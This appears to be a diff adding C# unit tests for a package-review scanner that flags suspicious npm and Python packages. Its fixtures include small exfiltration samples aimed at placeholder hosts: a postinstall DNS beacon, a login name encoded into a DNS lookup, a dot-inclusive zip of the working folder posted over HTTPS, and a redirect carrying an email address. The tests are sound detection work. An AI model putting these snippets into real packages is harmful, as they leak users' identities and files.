@@ -2250,6 +2250,19 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void A_constant_lookup_from_an_install_script_that_is_the_only_code_file_is_noteworthy()
+    {
+        var only = Review(Tgz("beacon-1.0.0.tgz",
+            ("package/package.json", """{"name":"beacon-check","version":"1.0.0","scripts":{"postinstall":"node index.js"}}"""),
+            ("package/index.js", "const dns = require('dns');\ndns.lookup('host.example.invalid', () => {});")));
+        Assert.Contains(only.Findings, f => f is { Rule: "package/dns-send", Level: "noteworthy" });
+        var more = Review(Tgz("beacon-1.0.1.tgz",
+            ("package/package.json", """{"name":"beacon-check","version":"1.0.1","main":"lib/main.js","scripts":{"postinstall":"node index.js"}}"""),
+            ("package/index.js", "const dns = require('dns');\ndns.lookup('host.example.invalid', () => {});"), ("package/lib/main.js", "module.exports = 1;")));
+        Assert.Contains(more.Findings, f => f is { Rule: "package/dns-send", Level: "review" });
+    }
+
+    [Fact]
     public void A_global_prefix_passed_through_a_function_to_a_link_under_bin_is_noteworthy_at_install()
     {
         var r = Review(Tgz("post-1.0.0.tgz",
@@ -2262,6 +2275,35 @@ public sealed class PackageReviewTests : IDisposable
             ("package/package.json", """{"name":"tool-setup","version":"1.0.1","scripts":{"postinstall":"node scripts/post.mjs"}}"""),
             ("package/scripts/post.mjs", "import { rmSync } from 'fs';\nrmSync('build/bin', { recursive: true, force: true });")));
         Assert.DoesNotContain(local.Findings, f => f.Rule == "package/command-replace");
+    }
+
+    [Fact]
+    public void A_location_set_from_a_variable_joining_a_url_and_an_address_literal_is_noteworthy()
+    {
+        const string code = "function go() {\n  var u = 'https://example.invalid/p';\n  var e = 'user@example.invalid';\n  var f = u + '#' + e;\n  window.location.href = f;\n}\ngo();";
+        Assert.Contains(PackageReview.Scan("index.js", code, install: false, default, entry: true, peel: false), f => f is { Rule: "package/redirect-entry", Level: "noteworthy" });
+        const string plain = "function go() {\n  var u = 'https://example.invalid/p';\n  var f = u + '#top';\n  window.location.href = f;\n}\nconst contact = 'user@example.invalid';";
+        Assert.DoesNotContain(PackageReview.Scan("index.js", plain, install: false, default, entry: true, peel: false), f => f.Rule == "package/redirect-entry");
+    }
+
+    [Fact]
+    public void A_dot_glob_of_the_working_folder_read_back_and_posted_is_noteworthy()
+    {
+        const string code = "const archiver = require('archiver');\nconst fs = require('fs'), https = require('https');\nconst out = fs.createWriteStream('w.zip');\n" +
+            "const archive = archiver('zip');\narchive.pipe(out);\narchive.glob('**/*', { ignore: ['.git/**'], dot: true });\narchive.finalize();\n" +
+            "out.on('close', () => {\n  const body = fs.readFileSync('w.zip');\n  const req = https.request({ host: 'example.invalid', method: 'POST', headers: { 'Content-Type': 'multipart/form-data; boundary=x' } });\n  req.end(body);\n});";
+        Assert.Contains(PackageReview.Scan("bin/tool.js", code, install: false, default, peel: false), f => f.Rule == "package/workspace-upload");
+        var own = code.Replace("dot: true", "dot: true, cwd: path.join(__dirname, 'assets')", StringComparison.Ordinal);
+        Assert.DoesNotContain(PackageReview.Scan("bin/tool.js", own, install: false, default, peel: false), f => f.Rule == "package/workspace-upload");
+    }
+
+    [Fact]
+    public void A_lookup_whose_name_chain_encodes_the_user_name_is_noteworthy_and_a_plain_chain_is_review()
+    {
+        const string code = "import base64, os, socket\nu = base64.b32encode(os.getlogin().encode()).decode()\nd = u + '.example.invalid'\nsocket.gethostbyname(d)\n";
+        Assert.Equal("noteworthy", PackageReview.Scan("setup.py", code, install: false, default, peel: false).Single(f => f.Rule == "package/dns-send").Level);
+        const string plain = "import socket\nname = settings.bucket\nd = name + '.example.invalid'\nsocket.gethostbyname(d)\n";
+        Assert.Equal("review", PackageReview.Scan("client.py", plain, install: false, default, peel: false).Single(f => f.Rule == "package/dns-send").Level);
     }
 
     [Fact]
